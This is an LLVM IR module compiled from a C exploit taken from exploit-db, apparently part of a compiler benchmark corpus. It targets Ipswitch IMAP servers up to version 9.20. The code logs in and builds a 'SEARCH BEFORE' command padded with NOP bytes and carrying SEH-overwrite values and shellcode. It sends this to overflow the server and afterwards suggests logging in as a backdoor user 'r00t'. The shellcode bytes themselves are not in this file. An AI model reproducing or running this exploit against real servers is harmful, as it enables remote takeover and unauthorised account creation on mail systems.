; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_9662.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_9662.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.fd_set = type { i32 }
%struct.timeval = type { i32, i64 }
%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i8* }
%struct.sockaddr = type { i32 }

@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [65 x i8] c"Ipsbitch vs Ipswitch IMAP <=v9.20\0A(C) dmc <dmc@deadbeef.co.uk>\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [9 x i8] c"0 LOGIN \00", align 1
@.str.2 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.5 = private unnamed_addr constant [17 x i8] c"2 SEARCH BEFORE \00", align 1
@.str.6 = private unnamed_addr constant [2 x i8] c"\90\00", align 1
@nextseh = common dso_local global i8* null, align 8
@seh = common dso_local global i8* null, align 8
@shellcode = common dso_local global i8* null, align 8
@.str.7 = private unnamed_addr constant [20 x i8] c"Unable to start WSA\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@INVALID_SOCKET = common dso_local global i64 0, align 8
@.str.8 = private unnamed_addr constant [17 x i8] c"[*] socket error\00", align 1
@.str.9 = private unnamed_addr constant [31 x i8] c"[*] Connecting to IMAP server\0A\00", align 1
@.str.10 = private unnamed_addr constant [20 x i8] c"[*] Got banner:\0A%s\0A\00", align 1
@.str.11 = private unnamed_addr constant [23 x i8] c"[*] Authenticating...\0A\00", align 1
@SOCKET_ERROR = common dso_local global i64 0, align 8
@.str.12 = private unnamed_addr constant [31 x i8] c"[*] error sending auth payload\00", align 1
@.str.13 = private unnamed_addr constant [18 x i8] c"[*] Received:\0A%s\0A\00", align 1
@.str.14 = private unnamed_addr constant [31 x i8] c"[*] Sending SELECT command...\0A\00", align 1
@.str.15 = private unnamed_addr constant [17 x i8] c"1 SELECT INBOX\0D\0A\00", align 1
@.str.16 = private unnamed_addr constant [32 x i8] c"[*] Sending exploit payload...\0A\00", align 1
@.str.17 = private unnamed_addr constant [34 x i8] c"[*] error sending exploit payload\00", align 1
@.str.18 = private unnamed_addr constant [39 x i8] c"[*] Now try USER=r00t PASS=r00tr00t!!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca %struct.fd_set, align 4
  %8 = alloca %struct.timeval, align 8
  %9 = alloca %struct.sockaddr_in, align 8
  %10 = alloca [20 x i8], align 16
  %11 = alloca [20 x i8], align 16
  %12 = alloca [2048 x i8], align 16
  %13 = alloca [1024 x i8], align 16
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [50 x i8], align 16
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %21 = load i32, i32* %4, align 4
  %22 = icmp slt i32 %21, 4
  br i1 %22, label %23, label %25

23:                                               ; preds = %2
  %24 = call i32 (...) @usage()
  store i32 0, i32* %3, align 4
  br label %243

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 3
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @strlen(i8* %28)
  %30 = icmp slt i32 %29, 15
  br i1 %30, label %31, label %50

31:                                               ; preds = %25
  %32 = load i8**, i8*** %5, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 4
  %34 = load i8*, i8** %33, align 8
  %35 = call i32 @strlen(i8* %34)
  %36 = icmp slt i32 %35, 15
  br i1 %36, label %37, label %50

37:                                               ; preds = %31
  %38 = getelementptr inbounds [20 x i8], [20 x i8]* %10, i64 0, i64 0
  %39 = load i8**, i8*** %5, align 8
  %40 = getelementptr inbounds i8*, i8** %39, i64 3
  %41 = load i8*, i8** %40, align 8
  %42 = call i32 @strncpy(i8* %38, i8* %41, i32 14)
  %43 = getelementptr inbounds [20 x i8], [20 x i8]* %11, i64 0, i64 0
  %44 = load i8**, i8*** %5, align 8
  %45 = getelementptr inbounds i8*, i8** %44, i64 4
  %46 = load i8*, i8** %45, align 8
  %47 = call i32 @strncpy(i8* %43, i8* %46, i32 14)
  %48 = getelementptr inbounds [20 x i8], [20 x i8]* %10, i64 0, i64 14
  store i8 0, i8* %48, align 2
  %49 = getelementptr inbounds [20 x i8], [20 x i8]* %11, i64 0, i64 14
  store i8 0, i8* %49, align 2
  br label %52

50:                                               ; preds = %31, %25
  %51 = call i32 (...) @usage()
  store i32 0, i32* %3, align 4
  br label %243

52:                                               ; preds = %37
  %53 = load i8**, i8*** %5, align 8
  %54 = getelementptr inbounds i8*, i8** %53, i64 1
  %55 = load i8*, i8** %54, align 8
  %56 = call i32 @inet_addr(i8* %55)
  %57 = call i8* @htonl(i32 %56)
  %58 = ptrtoint i8* %57 to i32
  store i32 %58, i32* %14, align 4
  %59 = load i8**, i8*** %5, align 8
  %60 = getelementptr inbounds i8*, i8** %59, i64 2
  %61 = load i8*, i8** %60, align 8
  %62 = call i32 @atoi(i8* %61)
  store i32 %62, i32* %15, align 4
  %63 = load i32, i32* @stderr, align 4
  %64 = call i32 (i32, i8*, ...) @fprintf(i32 %63, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str, i64 0, i64 0))
  %65 = getelementptr inbounds [50 x i8], [50 x i8]* %16, i64 0, i64 0
  %66 = call i32 @memset(i8* %65, i32 0, i32 50)
  %67 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %68 = call i32 @memset(i8* %67, i32 0, i32 1024)
  %69 = getelementptr inbounds [50 x i8], [50 x i8]* %16, i64 0, i64 0
  %70 = call i32 @strcat(i8* %69, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  %71 = getelementptr inbounds [50 x i8], [50 x i8]* %16, i64 0, i64 0
  %72 = getelementptr inbounds [20 x i8], [20 x i8]* %10, i64 0, i64 0
  %73 = call i32 @strcat(i8* %71, i8* %72)
  %74 = getelementptr inbounds [50 x i8], [50 x i8]* %16, i64 0, i64 0
  %75 = call i32 @strcat(i8* %74, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i64 0, i64 0))
  %76 = getelementptr inbounds [50 x i8], [50 x i8]* %16, i64 0, i64 0
  %77 = getelementptr inbounds [20 x i8], [20 x i8]* %11, i64 0, i64 0
  %78 = call i32 @strcat(i8* %76, i8* %77)
  %79 = getelementptr inbounds [50 x i8], [50 x i8]* %16, i64 0, i64 0
  %80 = call i32 @strcat(i8* %79, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0))
  %81 = getelementptr inbounds [50 x i8], [50 x i8]* %16, i64 0, i64 0
  %82 = call i32 @strcat(i8* %81, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i64 0, i64 0))
  %83 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %84 = call i32 @memset(i8* %83, i32 0, i32 2048)
  %85 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %86 = call i32 @strcat(i8* %85, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %17, align 4
  br label %87

87:                                               ; preds = %93, %52
  %88 = load i32, i32* %17, align 4
  %89 = icmp slt i32 %88, 80
  br i1 %89, label %90, label %96

90:                                               ; preds = %87
  %91 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %92 = call i32 @strcat(i8* %91, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0))
  br label %93

93:                                               ; preds = %90
  %94 = load i32, i32* %17, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %17, align 4
  br label %87

96:                                               ; preds = %87
  %97 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %98 = load i8*, i8** @nextseh, align 8
  %99 = call i32 @strcat(i8* %97, i8* %98)
  %100 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %101 = load i8*, i8** @seh, align 8
  %102 = call i32 @strcat(i8* %100, i8* %101)
  store i32 0, i32* %18, align 4
  br label %103

103:                                              ; preds = %109, %96
  %104 = load i32, i32* %18, align 4
  %105 = icmp slt i32 %104, 100
  br i1 %105, label %106, label %112

106:                                              ; preds = %103
  %107 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %108 = call i32 @strcat(i8* %107, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0))
  br label %109

109:                                              ; preds = %106
  %110 = load i32, i32* %18, align 4
  %111 = add nsw i32 %110, 1
  store i32 %111, i32* %18, align 4
  br label %103

112:                                              ; preds = %103
  %113 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %114 = load i8*, i8** @shellcode, align 8
  %115 = call i32 @strcat(i8* %113, i8* %114)
  store i32 0, i32* %19, align 4
  br label %116

116:                                              ; preds = %122, %112
  %117 = load i32, i32* %19, align 4
  %118 = icmp slt i32 %117, 300
  br i1 %118, label %119, label %125

119:                                              ; preds = %116
  %120 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %121 = call i32 @strcat(i8* %120, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i64 0, i64 0))
  br label %122

122:                                              ; preds = %119
  %123 = load i32, i32* %19, align 4
  %124 = add nsw i32 %123, 1
  store i32 %124, i32* %19, align 4
  br label %116

125:                                              ; preds = %116
  %126 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %127 = call i32 @strcat(i8* %126, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0))
  %128 = call i32 @MAKEWORD(i32 2, i32 0)
  %129 = call i64 @WSAStartup(i32 %128, i32* %20)
  %130 = icmp ne i64 %129, 0
  br i1 %130, label %131, label %133

131:                                              ; preds = %125
  %132 = call i32 @error(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.7, i64 0, i64 0))
  br label %133

133:                                              ; preds = %131, %125
  %134 = load i32, i32* @AF_INET, align 4
  %135 = load i32, i32* @SOCK_STREAM, align 4
  %136 = call i64 @socket(i32 %134, i32 %135, i32 0)
  store i64 %136, i64* %6, align 8
  %137 = load i64, i64* %6, align 8
  %138 = load i64, i64* @INVALID_SOCKET, align 8
  %139 = icmp eq i64 %137, %138
  br i1 %139, label %140, label %142

140:                                              ; preds = %133
  %141 = call i32 @error(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.8, i64 0, i64 0))
  br label %142

142:                                              ; preds = %140, %133
  %143 = load i32, i32* @AF_INET, align 4
  %144 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  store i32 %143, i32* %144, align 8
  %145 = load i32, i32* %14, align 4
  %146 = call i8* @htonl(i32 %145)
  %147 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  %148 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %147, i32 0, i32 0
  store i8* %146, i8** %148, align 8
  %149 = load i32, i32* %15, align 4
  %150 = call i32 @htons(i32 %149)
  %151 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i32 %150, i32* %151, align 8
  %152 = load i64, i64* %6, align 8
  %153 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %154 = call i32 @WSAConnect(i64 %152, %struct.sockaddr* %153, i32 24, i32* null, i32* null, i32* null, i32* null)
  %155 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 0
  store i32 3, i32* %155, align 8
  %156 = getelementptr inbounds %struct.timeval, %struct.timeval* %8, i32 0, i32 1
  store i64 0, i64* %156, align 8
  %157 = call i32 @FD_ZERO(%struct.fd_set* %7)
  %158 = load i64, i64* %6, align 8
  %159 = call i32 @FD_SET(i64 %158, %struct.fd_set* %7)
  %160 = load i64, i64* %6, align 8
  %161 = add nsw i64 %160, 1
  %162 = call i32 @select(i64 %161, i32* null, %struct.fd_set* %7, i32* null, %struct.timeval* %8)
  %163 = load i64, i64* %6, align 8
  %164 = call i64 @FD_ISSET(i64 %163, %struct.fd_set* %7)
  %165 = icmp ne i64 %164, 0
  br i1 %165, label %166, label %243

166:                                              ; preds = %142
  %167 = load i32, i32* @stderr, align 4
  %168 = call i32 (i32, i8*, ...) @fprintf(i32 %167, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.9, i64 0, i64 0))
  %169 = call i32 @Sleep(i32 1000)
  %170 = load i64, i64* %6, align 8
  %171 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %172 = call i32 @recv(i64 %170, i8* %171, i32 200, i32 0)
  %173 = load i32, i32* @stderr, align 4
  %174 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %175 = call i32 (i32, i8*, ...) @fprintf(i32 %173, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.10, i64 0, i64 0), i8* %174)
  %176 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %177 = call i32 @memset(i8* %176, i32 0, i32 1024)
  %178 = load i32, i32* @stderr, align 4
  %179 = call i32 (i32, i8*, ...) @fprintf(i32 %178, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.11, i64 0, i64 0))
  %180 = load i64, i64* %6, align 8
  %181 = getelementptr inbounds [50 x i8], [50 x i8]* %16, i64 0, i64 0
  %182 = getelementptr inbounds [50 x i8], [50 x i8]* %16, i64 0, i64 0
  %183 = call i32 @strlen(i8* %182)
  %184 = call i64 @send(i64 %180, i8* %181, i32 %183, i32 0)
  %185 = load i64, i64* @SOCKET_ERROR, align 8
  %186 = icmp eq i64 %184, %185
  br i1 %186, label %187, label %189

187:                                              ; preds = %166
  %188 = call i32 @error(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.12, i64 0, i64 0))
  br label %189

189:                                              ; preds = %187, %166
  %190 = getelementptr inbounds [50 x i8], [50 x i8]* %16, i64 0, i64 0
  %191 = call i32 @memset(i8* %190, i32 0, i32 50)
  %192 = call i32 @Sleep(i32 1000)
  %193 = load i64, i64* %6, align 8
  %194 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %195 = call i32 @recv(i64 %193, i8* %194, i32 200, i32 0)
  %196 = load i32, i32* @stderr, align 4
  %197 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %198 = call i32 (i32, i8*, ...) @fprintf(i32 %196, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.13, i64 0, i64 0), i8* %197)
  %199 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %200 = call i32 @memset(i8* %199, i32 0, i32 1024)
  %201 = load i32, i32* @stderr, align 4
  %202 = call i32 (i32, i8*, ...) @fprintf(i32 %201, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.14, i64 0, i64 0))
  %203 = load i64, i64* %6, align 8
  %204 = call i32 @strlen(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i64 0, i64 0))
  %205 = call i64 @send(i64 %203, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i64 0, i64 0), i32 %204, i32 0)
  %206 = load i64, i64* @SOCKET_ERROR, align 8
  %207 = icmp eq i64 %205, %206
  br i1 %207, label %208, label %210

208:                                              ; preds = %189
  %209 = call i32 @error(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.12, i64 0, i64 0))
  br label %210

210:                                              ; preds = %208, %189
  %211 = call i32 @Sleep(i32 1000)
  %212 = load i64, i64* %6, align 8
  %213 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %214 = call i32 @recv(i64 %212, i8* %213, i32 200, i32 0)
  %215 = load i32, i32* @stderr, align 4
  %216 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %217 = call i32 (i32, i8*, ...) @fprintf(i32 %215, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.13, i64 0, i64 0), i8* %216)
  %218 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %219 = call i32 @memset(i8* %218, i32 0, i32 1024)
  %220 = call i32 @Sleep(i32 1000)
  %221 = load i64, i64* %6, align 8
  %222 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %223 = call i32 @recv(i64 %221, i8* %222, i32 200, i32 0)
  %224 = load i32, i32* @stderr, align 4
  %225 = getelementptr inbounds [1024 x i8], [1024 x i8]* %13, i64 0, i64 0
  %226 = call i32 (i32, i8*, ...) @fprintf(i32 %224, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.13, i64 0, i64 0), i8* %225)
  %227 = load i32, i32* @stderr, align 4
  %228 = call i32 (i32, i8*, ...) @fprintf(i32 %227, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.16, i64 0, i64 0))
  %229 = load i64, i64* %6, align 8
  %230 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %231 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %232 = call i32 @strlen(i8* %231)
  %233 = call i64 @send(i64 %229, i8* %230, i32 %232, i32 0)
  %234 = load i64, i64* @SOCKET_ERROR, align 8
  %235 = icmp eq i64 %233, %234
  br i1 %235, label %236, label %238

236:                                              ; preds = %210
  %237 = call i32 @error(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.17, i64 0, i64 0))
  br label %238

238:                                              ; preds = %236, %210
  %239 = getelementptr inbounds [2048 x i8], [2048 x i8]* %12, i64 0, i64 0
  %240 = call i32 @memset(i8* %239, i32 0, i32 2048)
  %241 = load i32, i32* @stderr, align 4
  %242 = call i32 (i32, i8*, ...) @fprintf(i32 %241, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.18, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %243

243:                                              ; preds = %23, %50, %238, %142
  %244 = load i32, i32* %3, align 4
  ret i32 %244
}

declare dso_local i32 @usage(...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strncpy(i8*, i8*, i32) #1

declare dso_local i8* @htonl(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i64 @WSAStartup(i32, i32*) #1

declare dso_local i32 @MAKEWORD(i32, i32) #1

declare dso_local i32 @error(i8*) #1

declare dso_local i64 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @WSAConnect(i64, %struct.sockaddr*, i32, i32*, i32*, i32*, i32*) #1

declare dso_local i32 @FD_ZERO(%struct.fd_set*) #1

declare dso_local i32 @FD_SET(i64, %struct.fd_set*) #1

declare dso_local i32 @select(i64, i32*, %struct.fd_set*, i32*, %struct.timeval*) #1

declare dso_local i64 @FD_ISSET(i64, %struct.fd_set*) #1

declare dso_local i32 @Sleep(i32) #1

declare dso_local i32 @recv(i64, i8*, i32, i32) #1

declare dso_local i64 @send(i64, i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
